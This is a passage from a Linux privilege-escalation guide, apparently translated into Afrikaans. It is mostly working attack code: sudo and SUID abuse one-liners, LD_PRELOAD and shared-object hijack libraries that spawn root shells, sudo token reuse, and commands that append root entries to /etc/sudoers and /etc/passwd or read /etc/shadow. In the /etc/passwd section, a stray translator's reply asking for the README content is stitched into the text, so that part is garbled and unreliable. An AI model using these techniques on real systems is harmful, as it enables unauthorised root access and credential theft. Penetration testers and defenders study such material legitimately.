```
### Sniffing

Kontroleer of jy traffic kan sniff. Indien ja, kan jy moontlik credentials kry.
```
timeout 1 tcpdump
```
## Gebruikers

### Generiese Enumerasie

Kontroleer **wie** jy is, watter **voorregte** jy het, watter **gebruikers** in die stelsels is, watter van hulle kan **login** en watter het **root voorregte:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Groot UID

Sommige Linux-weergawes is deur 'n fout geraak wat gebruikers met **UID > INT_MAX** toelaat om voorregte te eskaleer. Meer inligting: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Groepe

Kontroleer of jy 'n **lid van 'n groep** is wat jou root-voorregte kan gee:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Klembord

Kyk of daar iets interessants in die klembord is (indien moontlik)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Wagwoordbeleid
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bekende wagwoorde

As jy **enige wagwoord** van die omgewing ken, **probeer om as elke gebruiker aan te meld** met daardie wagwoord.

### Su Brute

As jy nie omgee om baie geraas te maak nie en die `su` en `timeout` binaries op die rekenaar teenwoordig is, kan jy probeer om gebruikers te brute-force met [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) met die `-a` parameter probeer ook om gebruikers te brute-force.

## Skryfbare PATH misbruik

### $PATH

As jy ontdek dat jy **in 'n gids van die $PATH kan skryf**, kan jy dalk bevoegdhede verhoog deur **'n backdoor in die skryfbare gids te skep** met die naam van 'n opdrag wat deur 'n ander gebruiker (idealiter root) uitgevoer gaan word en wat **nie vanaf 'n gids gelaai word wat voor jou skryfbare gids in die $PATH geleë is nie.**

### SUDO and SUID

Jy mag toegelaat word om sekere opdragte met sudo uit te voer, of dit kan die suid bit hê. Kontroleer dit met:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Sommige **onverwagte opdragte laat jou toe om lêers te lees en/of te skryf of selfs 'n opdrag uit te voer.** Byvoorbeeld:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo-konfigurasie kan 'n user toelaat om 'n command met die voorregte van 'n ander user uit te voer sonder om die password te ken.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
In hierdie voorbeeld kan die gebruiker `demo` `vim` as `root` uitvoer, dit is nou triviaal om 'n shell te kry deur 'n ssh key in die root directory te voeg of deur `sh` aan te roep.
```
sudo vim -c '!sh'
```
### SETENV

Hierdie direktief laat die gebruiker toe om **set an environment variable** terwyl iets uitgevoer word:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Hierdie voorbeeld, **gebaseer op HTB machine Admirer**, was **vatbaar** vir **PYTHONPATH hijacking** om 'n willekeurige python-biblioteek te laai terwyl die skrip as root uitgevoer is:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV behou via sudo env_keep → root shell

As sudoers `BASH_ENV` behou (bv. `Defaults env_keep+="ENV BASH_ENV"`), kan jy Bash se nie-interaktiewe opstartgedrag benut om willekeurige kode as root uit te voer wanneer 'n toegelate opdrag aangeroep word.

- Waarom dit werk: Vir nie-interaktiewe shells evalueer Bash `$BASH_ENV` en source daardie lêer voordat die teikenskrip uitgevoer word. Baie sudo-reëls laat toe om 'n skrip of 'n shell-wrapper uit te voer. As `BASH_ENV` deur sudo behou word, word jou lêer met root-voorregte gesourced.

- Vereistes:
- 'n sudo-reël wat jy kan uitvoer (enige teiken wat `/bin/bash` nie-interaktief oproep, of enige bash-skrip).
- `BASH_ENV` teenwoordig in `env_keep` (kontroleer met `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Verharding:
- Verwyder `BASH_ENV` (en `ENV`) uit `env_keep`; verkies `env_reset`.
- Vermy shell-wrappers vir sudo-allowed opdragte; gebruik minimale binaries.
- Oorweeg sudo I/O-logboekvoering en waarskuwings wanneer bewaarde env vars gebruik word.

### Sudo uitvoering omseilingspade

**Jump** om ander lêers te lees of gebruik **symlinks**. Byvoorbeeld in sudoers file: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Indien **wildcard** gebruik word (\*), is dit selfs makliker:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Teenmaatreëls**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary sonder command path

As die **sudo permission** aan 'n enkele command' gegee word **sonder om die path te spesifiseer**: _hacker10 ALL= (root) less_ kan jy dit uitbuit deur die PATH variable te verander
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Hierdie tegniek kan ook gebruik word as 'n **suid** binary **voer 'n ander opdrag uit sonder om die pad daarvoor te spesifiseer (kontroleer altyd met** _**strings**_ **die inhoud van 'n vreemde SUID binary)**).

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary met opdragpad

As die **suid** binary **'n ander opdrag uitvoer en die pad daarvoor spesifiseer**, kan jy probeer om 'n funksie met dieselfde naam as die opdrag wat die suid-lêer oproep, te **export**.

Byvoorbeeld, as 'n suid binary aanroep _**/usr/sbin/service apache2 start**_ moet jy probeer om die funksie te skep en dit te **export**:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Dan, wanneer jy die suid binary aanroep, sal hierdie funksie uitgevoer word

### LD_PRELOAD & **LD_LIBRARY_PATH**

Die **LD_PRELOAD** omgewingveranderlike word gebruik om een of meer gedeelde biblioteke (.so files) te spesifiseer wat deur die laaier voor alle ander gelaai word, insluitend die standaard C-biblioteek (`libc.so`). Hierdie proses staan bekend as die vooraflading van 'n biblioteek.

Om die stelsel se sekuriteit te handhaaf en te verhoed dat hierdie funksie uitgebuit word, veral met **suid/sgid** uitvoerbare lêers, stel die stelsel sekere voorwaardes af:

- Die laaier ignoreer **LD_PRELOAD** vir uitvoerbare lêers waar die werklike gebruikers-ID (_ruid_) nie ooreenstem met die effektiewe gebruikers-ID (_euid_) nie.
- Vir uitvoerbare lêers met suid/sgid word slegs biblioteke in standaardpade wat ook suid/sgid is voorafgelaai.

Privilege escalation kan voorkom as jy die vermoë het om opdragte met `sudo` uit te voer en die uitset van `sudo -l` die stelling **env_keep+=LD_PRELOAD** insluit. Hierdie konfigurasie laat toe dat die **LD_PRELOAD** omgewingveranderlike behoue bly en erken word selfs wanneer opdragte met `sudo` uitgevoer word, wat moontlik kan lei tot die uitvoering van arbitrêre kode met verhoogde regte.
```
Defaults        env_keep += LD_PRELOAD
```
Stoor as **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Dan **kompileer dit** met:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Laastens, **escalate privileges** lopend
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 'n soortgelyke privesc kan misbruik word as die aanvaller die **LD_LIBRARY_PATH** env variable beheer, omdat hy die pad beheer waar libraries gesoek gaan word.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Wanneer jy op 'n binary met **SUID**-toegangsregte stuit wat ongewone voorkom, is dit 'n goeie praktyk om te verifieer of dit **.so**-lêers behoorlik laai. Dit kan nagegaan word deur die volgende opdrag uit te voer:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Byvoorbeeld, om 'n fout teë te kom soos _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ dui op 'n potensiaal vir uitbuiting.

Om dit uit te buit, sal 'n mens voortgaan deur 'n C-lêer te skep, sê _"/path/to/.config/libcalc.c"_, wat die volgende kode bevat:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Hierdie kode, sodra dit saamgestel en uitgevoer is, poog om privileges te verhoog deur lêertoestemmings te manipuleer en 'n shell met verhoogde privileges uit te voer.

Kompileer die bogenoemde C file in 'n shared object (.so) file met:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Uiteindelik behoort die uitvoering van die aangetaste SUID binary die exploit te aktiveer, wat tot 'n potensiële system compromise kan lei.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Nou dat ons 'n SUID binary gevind het wat 'n library vanaf 'n folder laai waarin ons kan skryf, laat ons die library in daardie folder skep met die nodige naam:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
As jy 'n fout kry soos
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
dit beteken dat die biblioteek wat jy gegenereer het `a_function_name` moet hê.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) is 'n gekureerde lys van Unix binaries wat deur 'n aanvaller misbruik kan word om plaaslike sekuriteitsbeperkings te omseil. [**GTFOArgs**](https://gtfoargs.github.io/) is dieselfde maar vir gevalle waar jy **slegs inject argumente** in 'n opdrag kan.

Die projek versamel legitime funksies van Unix binaries wat misbruik kan word om uit restricted shells te breek, privileges te eskaleer of te behou, lêers oor te dra, bind en reverse shells te spawn, en ander post-exploitation take te vergemaklik.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

As jy toegang tot `sudo -l` het, kan jy die tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) gebruik om te kyk of dit 'n manier vind om enige sudo-reël uit te buiten.

### Reusing Sudo Tokens

In gevalle waar jy **sudo access** het maar nie die wagwoord nie, kan jy privileges eskaleer deur **te wag vir 'n sudo-opdrag uitvoering en dan die sessie-token te kap**.

Requirements to escalate privileges:

- Jy het reeds 'n shell as gebruiker "_sampleuser_"
- "_sampleuser_" het **`sudo` gebruik** om iets uit te voer in die **laaste 15mins** (per verstek is dit die duur van die sudo token wat ons toelaat om `sudo` te gebruik sonder om 'n wagwoord in te voer)
- `cat /proc/sys/kernel/yama/ptrace_scope` is 0
- `gdb` is toeganklik (jy kan dit oplaai)

(Jy kan tydelik `ptrace_scope` aktiveer met `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` of permanent deur `/etc/sysctl.d/10-ptrace.conf` te wysig en `kernel.yama.ptrace_scope = 0` te stel)

As al hierdie vereistes vervul is, **kan jy privileges eskaleer met:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Die **eerste exploit** (`exploit.sh`) sal die binary `activate_sudo_token` in _/tmp_ skep. Jy kan dit gebruik om die sudo token in jou sessie te **aktiveer** (jy kry nie outomaties 'n root shell nie, doen `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Die **tweede exploit** (`exploit_v2.sh`) sal 'n sh shell in _/tmp_ skep wat **deur root besit word en setuid het**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Die **derde exploit** (`exploit_v3.sh`) sal **'n sudoers file skep** wat **sudo tokens ewigdurend maak en alle gebruikers toelaat om sudo te gebruik**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

As jy **skryfregte** in die gids het of op enige van die geskepte lêers binne die gids, kan jy die binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) gebruik om **'n sudo-token vir 'n gebruiker en PID te skep**.\
Byvoorbeeld, as jy die lêer _/var/run/sudo/ts/sampleuser_ kan oorskryf en jy 'n shell as daardie gebruiker met PID 1234 het, kan jy **sudo privileges verkry** sonder om die wagwoord te hoef te ken deur:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Die lêer `/etc/sudoers` en die lêers binne `/etc/sudoers.d` konfigureer wie `sudo` kan gebruik en hoe. Hierdie lêers **kan standaard slegs deur gebruiker root en groep root gelees word**.\
**As** jy hierdie lêer kan **lees** kan jy moontlik **interessante inligting verkry**, en as jy enige lêer kan **skryf** sal jy in staat wees om **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
As jy kan skryf, kan jy hierdie toestemming misbruik.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Nog 'n manier om hierdie permissions te misbruik:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Daar is 'n paar alternatiewe vir die `sudo` binêre, soos `doas` vir OpenBSD; onthou om die konfigurasie by `/etc/doas.conf` na te gaan.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

As jy weet dat 'n gebruiker gewoonlik aan 'n masjien koppel en `sudo` gebruik om bevoegdhede te eskaleer en jy het 'n shell binne daardie gebruiker-konteks, kan jy **'n nuwe sudo executable skep** wat jou kode as root sal uitvoer en daarna die gebruiker se opdrag. Daarna, **wysig die $PATH** van die gebruiker-konteks (byvoorbeeld deur die nuwe pad in .bash_profile by te voeg) sodat wanneer die gebruiker sudo uitvoer, jou sudo executable uitgevoer word.

Let wel dat as die gebruiker 'n ander shell gebruik (nie bash nie) jy ander lêers sal moet wysig om die nuwe pad by te voeg. Byvoorbeeld[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) wysig `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Jy kan nog 'n voorbeeld vind in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Of deur iets soos die volgende uit te voer:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Gedeelde Biblioteek

### ld.so

Die lêer `/etc/ld.so.conf` dui aan **waarheen die gelaaide konfigurasielêers vandaan kom**. Tipies bevat hierdie lêer die volgende pad: `include /etc/ld.so.conf.d/*.conf`

Dit beteken dat die konfigurasielêers van `/etc/ld.so.conf.d/*.conf` gelees sal word. Hierdie konfigurasielêers **wys na ander vouers** waar **biblioteke** gaan **gesoek** word. Byvoorbeeld, die inhoud van `/etc/ld.so.conf.d/libc.conf` is `/usr/local/lib`. **Dit beteken dat die stelsel sal soek na biblioteke binne `/usr/local/lib`**.

As om een of ander rede **'n gebruiker skryfregte het** op enige van die aangeduide paaie: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, enige lêer binne `/etc/ld.so.conf.d/` of enige vouer binne die konfigurasielêer binne `/etc/ld.so.conf.d/*.conf` mag hy in staat wees om toeskrywings te escalate privileges.\
Kyk na **how to exploit this misconfiguration** in die volgende bladsy:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Deur die lib na `/var/tmp/flag15/` te kopieer, sal dit deur die program op hierdie plek gebruik word soos gespesifiseer in die `RPATH`-veranderlike.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Skep dan 'n kwaadaardige biblioteek in `/var/tmp` met `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Bevoegdhede

Linux capabilities bied 'n **substel van die beskikbare root-bevoegdhede aan 'n proses**. Dit breek effektief die root **bevoegdhede op in kleiner en afsonderlike eenhede**. Elke een van hierdie eenhede kan dan onafhanklik aan prosesse toegestaan word. Op hierdie wyse word die volle stel bevoegdhede verminder, wat die risiko's van uitbuiting verlaag.\
Lees die volgende bladsy om **meer te leer oor bevoegdhede en hoe om dit te misbruik**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Gids-toestemmings

In 'n gids dui die **bit vir "execute"** daarop dat die betrokke gebruiker in die vouer kan "**cd**" into the folder.\
Die **"read"** bit dui aan dat die gebruiker die **lêers** kan **lys**, en die **"write"** bit dui aan dat die gebruiker **lêers** kan **verwyder** en nuwe **lêers** kan **skep**.

## ACLs

Toegangsbeheerlyste (ACLs) verteenwoordig die sekondêre laag van diskresionêre toestemmings, wat die tradisionele ugo/rwx-toestemmings kan **oorheers**. Hierdie toestemmings verbeter die beheer oor lêer- of gids-toegang deur regte vir spesifieke gebruikers toe te staan of te weier — gebruikers wat nie die eienaars is of deel van die groep nie. Hierdie vlak van **granulariteit verseker meer presiese toegangsbestuur**. Verdere besonderhede is beskikbaar [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Gee** gebruiker "kali" lees- en skryftoestemmings oor 'n lêer:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Kry** lêers met spesifieke ACLs van die stelsel:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Oop shell sessions

In **oue weergawes** kan jy **hijack** 'n **shell** session van 'n ander gebruiker (**root**).\
In **nuutste weergawes** sal jy net na screen sessions van **jou eie gebruiker** **connect**. Jy kan egter **interessante inligting binne die session** vind.

### screen sessions hijacking

**Lys screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Koppel aan 'n sessie**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Dit was 'n probleem met **ou tmux-weergawes**. Ek kon nie 'n tmux (v2.1) sessie wat deur root geskep is, as 'n nie-geprivilegieerde gebruiker hijack nie.

**Lys tmux sessies**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Koppel aan 'n sessie**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Kyk na **Valentine box from HTB** vir 'n voorbeeld.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Alle SSL en SSH keys wat op Debian-gebaseerde stelsels (Ubuntu, Kubuntu, etc) tussen September 2006 en 13 Mei 2008 gegenereer is, kan deur hierdie fout beïnvloed wees.  
Hierdie fout word veroorsaak wanneer 'n nuwe ssh key op daardie OS geskep is, omdat **slegs 32,768 variasies moontlik was**. Dit beteken dat al die moontlikhede bereken kan word en **met die ssh public key kan jy die ooreenstemmende private key soek**. Die berekende moontlikhede kan hier gevind word: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interessante konfigurasiewaardes

- **PasswordAuthentication:** Gee aan of password authentication toegelaat word. Die verstek is `no`.
- **PubkeyAuthentication:** Gee aan of public key authentication toegelaat word. Die verstek is `yes`.
- **PermitEmptyPasswords**: Wanneer password authentication toegelaat word, spesifiseer dit of die bediener aanmelding op rekeninge met leë wagwoordstringe toelaat. Die verstek is `no`.

### PermitRootLogin

Gee aan of root met ssh kan aanmeld; verstek is `no`. Moontlike waardes:

- `yes`: root kan aanmeld met wagwoord en private key
- `without-password` of `prohibit-password`: root kan slegs aanmeld met 'n private key
- `forced-commands-only`: Root kan slegs aanmeld met 'n private key en slegs as die commands-opsies gespesifiseer is
- `no` : nee

### AuthorizedKeysFile

Gee aan watter lêers die public keys bevat wat vir gebruiker-autentisering gebruik kan word. Dit kan tokens soos `%h` bevat, wat deur die tuismap vervang sal word. **Jy kan absolute paadjies aandui** (wat begin met `/`) of **relatiewe paadjies vanaf die gebruiker se tuismap**. Byvoorbeeld:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Daardie konfigurasie sal aandui dat as jy probeer aanmeld met die **private** sleutel van die gebruiker "**testusername**", sal ssh die **public key** van jou sleutel vergelyk met dié wat in `/home/testusername/.ssh/authorized_keys` en `/home/testusername/access` geleë is.

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding laat jou toe om jou plaaslike SSH keys te gebruik in plaas daarvan om sleutels (sonder passphrases!) op jou bediener te los. Sodoende sal jy in staat wees om **jump** via ssh **na 'n host** en van daaruit **jump na 'n ander** host **met** die **key** wat op jou **initial host** geleë is.

Jy moet hierdie opsie in `$HOME/.ssh.config` stel soos volg:
```
Host example.com
ForwardAgent yes
```
Let daarop dat as `Host` `*` is, elke keer as die gebruiker na 'n ander masjien spring, daardie host toegang tot die sleutels sal hê (wat 'n sekuriteitsprobleem is).

Die lêer `/etc/ssh_config` kan hierdie **opsies** **oorskryf** en hierdie konfigurasie toelaat of weier.\
Die lêer `/etc/sshd_config` kan ssh-agent forwarding **toelaat** of **weier** met die sleutelwoord `AllowAgentForwarding` (standaard is allow).

As jy vind dat Forward Agent in 'n omgewing gekonfigureer is, lees die volgende bladsy aangesien **jy dit moontlik kan misbruik om bevoegdhede te eskaleer**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interessante Lêers

### Profiel-lêers

Die lêer `/etc/profile` en die lêers onder `/etc/profile.d/` is **skripte wat uitgevoer word wanneer 'n gebruiker 'n nuwe shell begin**. Daarom, as jy enige van hulle kan **skryf of wysig**, kan jy bevoegdhede eskaleer.
```bash
ls -l /etc/profile /etc/profile.d/
```
As 'n vreemde profielskrip gevind word, moet jy dit nagaan vir **sensitiewe besonderhede**.

### Passwd/Shadow lêers

Afhangend van die OS kan die `/etc/passwd` en `/etc/shadow` lêers 'n ander naam gebruik of daar mag 'n rugsteun wees. Daarom word dit aanbeveel om **al hulle te vind** en **te kontroleer of jy dit kan lees** om te sien **of daar hashes binne die lêers is**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
In sommige gevalle kan jy **password hashes** in die `/etc/passwd` (of ekwivalente) lêer vind.
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Skryfbare /etc/passwd

Eerstens, genereer 'n password met een van die volgende opdragte.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Ik het die inhoud van src/linux-hardening/privilege-escalation/README.md nodig om dit te kan vertaal. Plak asseblief die markdown-inhoud hier.

Bevestig ook:
- Wil jy dat ek 'n sterk wagwoord genereer en dit by die vertaalde README voeg (visueel, as teks)?
- Is dit vir 'n wettige/legitieme gebruik op jou eie stelsel?

Sodra jy die README hier plak en bevestig, sal ek dit na Afrikaans vertaal volgens jou riglyne en dan die gebruiker `hacker` met die gegenereerde wagwoord byvoeg.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Byvoorbeeld: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Jy kan nou die `su` opdrag gebruik met `hacker:hacker`

Alternatiewelik kan jy die volgende reëls gebruik om 'n dummy gebruiker sonder 'n wagwoord by te voeg.\ WAARSKUWING: dit kan die huidige sekuriteit van die masjien verswak.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
LET WEL: Op BSD-platforme is `/etc/passwd` geleë by `/etc/pwd.db` en `/etc/master.passwd`, ook is `/etc/shadow` hernoem na `/etc/spwd.db`.

Jy moet nagaan of jy kan **in sekere sensitiewe lêers skryf**. Byvoorbeeld, kan jy skryf na 'n **dienskonfigurasielêer**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Byvoorbeeld, as die masjien 'n **tomcat** server uitvoer en jy die **Tomcat-dienskonfigurasielêer binne /etc/systemd/** kan wysig, kan jy die reëls wysig:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Jou backdoor sal uitgevoer word die volgende keer dat tomcat begin word.

### Kontroleer vouers

Die volgende vouers mag rugsteunkopieë of interessante inligting bevat: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Waarskynlik sal jy nie die laaste een kan lees nie, maar probeer)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Vreemde ligging/Owned lêers
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
